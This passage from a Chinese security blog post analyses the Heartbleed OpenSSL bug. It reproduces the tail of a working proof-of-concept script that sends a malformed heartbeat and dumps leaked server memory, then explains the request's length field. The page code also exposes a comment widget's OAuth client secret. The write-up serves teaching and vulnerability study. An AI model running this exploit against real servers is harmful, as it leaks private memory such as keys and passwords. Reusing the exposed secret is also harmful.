class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvall</span><span class="params">(s, length, timeout=<span class="number">5</span>)</span>:</span></div><div class="line">    endtime = time.time() + timeout</div><div class="line">    rdata = <span class="string">''</span></div><div class="line">    remain = length</div><div class="line">    <span class="keyword">while</span> remain &gt; <span class="number">0</span>:</div><div class="line">        rtime = endtime - time.time() </div><div class="line">        <span class="keyword">if</span> rtime &lt; <span class="number">0</span>:</div><div class="line">            <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">        r, w, e = select.select([s], [], [], <span class="number">5</span>)</div><div class="line">        <span class="keyword">if</span> s <span class="keyword">in</span> r:</div><div class="line">            data = s.recv(remain)</div><div class="line">            <span class="comment"># EOF?</span></div><div class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</div><div class="line">                <span class="keyword">return</span> <span class="keyword">None</span></div><div class="line">            rdata += data</div><div class="line">            remain -= len(data)</div><div class="line">    <span class="keyword">return</span> rdata</div><div class="line">        </div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">recvmsg</span><span class="params">(s)</span>:</span></div><div class="line">    hdr = recvall(s, <span class="number">5</span>)</div><div class="line">    <span class="keyword">if</span> hdr <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record header - server closed connection'</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></div><div class="line">    typ, ver, ln = struct.unpack(<span class="string">'&gt;BHH'</span>, hdr)</div><div class="line">    pay = recvall(s, ln, <span class="number">10</span>)</div><div class="line">    <span class="keyword">if</span> pay <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">        <span class="keyword">print</span> <span class="string">'Unexpected EOF receiving record payload - server closed connection'</span></div><div class="line">        <span class="keyword">return</span> <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></div><div class="line">    <span class="keyword">print</span> <span class="string">' ... received message: type = %d, ver = %04x, length = %d'</span> % (typ, ver, len(pay))</div><div class="line">    <span class="keyword">return</span> typ, ver, pay</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">hit_hb</span><span class="params">(s)</span>:</span></div><div class="line">    s.send(hb)</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)</div><div class="line">        <span class="keyword">if</span> typ <span class="keyword">is</span> <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'No heartbeat response received, server likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> typ == <span class="number">24</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'Received heartbeat response:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">if</span> len(pay) &gt; <span class="number">3</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'WARNING: server returned more data than it should - server is vulnerable!'</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">print</span> <span class="string">'Server processed malformed heartbeat, but did not return any extra data.'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line"></div><div class="line">        <span class="keyword">if</span> typ == <span class="number">21</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'Received alert:'</span></div><div class="line">            hexdump(pay)</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server returned error, likely not vulnerable'</span></div><div class="line">            <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></div><div class="line">    opts, args = options.parse_args()</div><div class="line">    <span class="keyword">if</span> len(args) &lt; <span class="number">1</span>:</div><div class="line">        options.print_help()</div><div class="line">        <span class="keyword">return</span></div><div class="line"></div><div class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">    <span class="keyword">print</span> <span class="string">'Connecting...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.connect((args[<span class="number">0</span>], opts.port))</div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending Client Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.send(hello)</div><div class="line">    <span class="keyword">print</span> <span class="string">'Waiting for Server Hello...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">        typ, ver, pay = recvmsg(s)</div><div class="line">        <span class="keyword">if</span> typ == <span class="keyword">None</span>:</div><div class="line">            <span class="keyword">print</span> <span class="string">'Server closed connection without sending Server Hello.'</span></div><div class="line">            <span class="keyword">return</span></div><div class="line">        <span class="comment"># Look for server hello done message.</span></div><div class="line">        <span class="keyword">if</span> typ == <span class="number">22</span> <span class="keyword">and</span> ord(pay[<span class="number">0</span>]) == <span class="number">0x0E</span>:</div><div class="line">            <span class="keyword">break</span></div><div class="line"></div><div class="line">    <span class="keyword">print</span> <span class="string">'Sending heartbeat request...'</span></div><div class="line">    sys.stdout.flush()</div><div class="line">    s.send(hb)</div><div class="line">    hit_hb(s)</div><div class="line"></div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    main()</div></pre></td></tr></table></figure>
+<p>我们可以看到，先建立了socket连接，然后发了<code>client Hello</code>，hello的内容为那一群二进制，推测应该是SSL client Hello的内容，我们抓包看一下，具体的字段分析可以看之前的SSL文章，这里注意，扩展中开启了<code>heartbeat</code>:</p>
+<img src="/blog/Heartbleed/client-hello.png" alt="client-hello" title="client-hello">  
+<p>直到收到<code>(typ==22)</code> 即 <code>server hello</code>类型的数据包，然后下一步。发送<code>hb</code>然后调用<code>hit_hb</code>，其中<code>hb</code>内容为我们构造的恶意<code>heartbeat</code>数据包</p>
+<img src="/blog/Heartbleed/heartbeat.png" alt="heartbeat" title="heartbeat">  
+<p>其中<code>request message</code>为<code>01 40 00</code> 分别对应:</p>
+<figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">type</span> = 01</span></div><div class="line"><span class="title">payload</span> length = <span class="number">0x40</span> <span class="number">00</span> = <span class="number">16384</span></div><div class="line"><span class="class"><span class="keyword">data</span> = null</span></div></pre></td></tr></table></figure>
+<p>这里只返回了16KB 的内容，极限是<code>F0 00(64KB)</code></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者：</strong>
+    empty_xl
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://yoursite.com/blog/Heartbleed/" title="OpenSSL Heartbleed  CVE-2014-0160">http://yoursite.com/blog/Heartbleed/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>
+    本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" rel="external nofollow" target="_blank">CC BY-NC-ND 4.0</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/openssl/" rel="tag"><i class="fa fa-tag"></i> openssl</a>
+          
+            <a href="/tags/heartbleed/" rel="tag"><i class="fa fa-tag"></i> heartbleed</a>
+          
+            <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/blog/unauthorized/" rel="next" title="未授权漏洞总结">
+                <i class="fa fa-chevron-left"></i> 未授权漏洞总结
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/blog/java-deserialization/" rel="prev" title="Java 序列化与反序列化 & Apache Commons Collections反序列化漏洞">
+                Java 序列化与反序列化 & Apache Commons Collections反序列化漏洞 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+    <link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">
+    <script src="https://imsun.github.io/gitment/dist/gitment.browser.js"></script>
+    <script>
+    var gitment = new Gitment({
+      // 根据文章标题设置唯一评论id
+    // id: '', // optional
+    owner: 'emptyxl',
+    repo: 'emptyxl.github.io',
+    oauth: {
+      client_id: 'fa7413e3c0207a96ae03',
+      client_secret: 'a599fef18d25ba5c813d2e437260892e146462a2',
+      }
+    })
+    gitment.render('comments')
+    </script>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="empty_xl" />
+          <p class="site-author-name" itemprop="name">empty_xl</p>
+           
+              <p class="site-description motion-element" itemprop="description">hello world!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">51</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">77</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/emptyxl" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                    
+                      Github
+                    
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="/mail/index.html" target="_blank" title="E-Mail">
+                  
+                    <i class="fa fa-fw fa-envelope"></i>
+                  
+                    
+                      E-Mail
+                    
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-nd.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Heartbeat-amp-TCP-keepalive"><span class="nav-number">1.</span> <span class="nav-text">Heartbeat & TCP keepalive</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#TCP-keepalive"><span class="nav-number">1.1.</span> <span class="nav-text">TCP keepalive</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Heartbeat"><span class="nav-number">1.2.</span> <span class="nav-text">Heartbeat</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#OpenSSL"><span class="nav-number">2.</span> <span class="nav-text">OpenSSL</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞影响"><span class="nav-number">3.</span> <span class="nav-text">漏洞影响</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">4.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#补丁分析"><span class="nav-number">5.</span> <span class="nav-text">补丁分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">6.</span> <span class="nav-text">漏洞利用</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    
+    &emsp;&emsp;|&emsp;
+  </span>
+  <span class="author" itemprop="copyrightHolder">empty_xl</span>
+</div>
+
+
+<div class="powered-by">
+  
+  Power &mdash; Hexo
+</div>
+
+<div class="theme-info">
+  
+  Theme &mdash; NexT.Mist
+</div>
+<div>
+<p>Hosted by <a href="https://pages.coding.me" style="font-weight: bold">Coding Pages</a></p>
+</div>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https') {
+        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+    }
+    else {
+        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+    }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
